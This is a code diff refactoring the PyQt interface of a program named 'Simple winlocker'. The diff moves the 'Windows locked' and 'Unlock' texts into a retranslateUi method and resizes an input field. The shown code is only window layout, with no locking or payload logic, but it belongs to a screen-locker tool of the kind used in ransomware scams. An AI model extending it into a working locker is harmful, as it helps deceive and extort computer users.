@@ -22,7 +22,6 @@ class SimpleWinlockerUI(QMainWindow):
         font.setPointSize(self.pointsize)
 
         self.label = QtWidgets.QLabel(self)
-        self.label.setText("Windows locked")
         self.label.setMinimumWidth(1024)
         self.label.setMinimumHeight(128)
         self.label.setStyleSheet("color: rgba(11, 11, 11, 125);")
@@ -31,7 +30,7 @@ class SimpleWinlockerUI(QMainWindow):
 
         self.lineEdit = QtWidgets.QLineEdit(self)
         self.lineEdit.setMinimumWidth(1024)
-        self.lineEdit.setMinimumHeight(128)
+        self.lineEdit.setMinimumHeight(256)
         self.lineEdit.move(self.screen_size.width() / 2 - self.lineEdit.width() / 2, self.screen_size.height() / 2 - self.lineEdit.height() / 2)
         self.lineEdit.setStyleSheet("background-color: transparent;\n"
         "color: rgba(11, 11, 11, 125);\n"
@@ -49,15 +48,26 @@ class SimpleWinlockerUI(QMainWindow):
         self.unlock_btn.setMinimumWidth(512)
         self.unlock_btn.setMinimumHeight(128)
         self.unlock_btn.move(self.screen_size.width() / 2 - self.unlock_btn.width() / 2, self.screen_size.height() - self.unlock_btn.height() / 2 - 64 - (self.screen_size.height() - self.label.height() / 2 - 64) / 4)
-        self.unlock_btn.setText("Unlock")
         self.unlock_btn.setFont(font)
         self.unlock_btn.setStyleSheet("color: rgba(11, 11, 11, 125); background-color: rgba(0, 0, 0, .04); border-radius: 32px;")
         self.unlock_btn.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
+
+
+        self.retranslateUi()
 
         # label.setMinimumWidth(1024)
         # label.setMinimumHeight(128)
     def update(self):
         self.label.adjustSize()
+
+    def retranslateUi(self):
+    	_translate = QtCore.QCoreApplication.translate
+
+    	self.setWindowTitle('Simple winlocker')
+    	self.unlock_btn.setText("Unlock")
+    	self.label.setText("Windows locked")
+
+
 
 
 
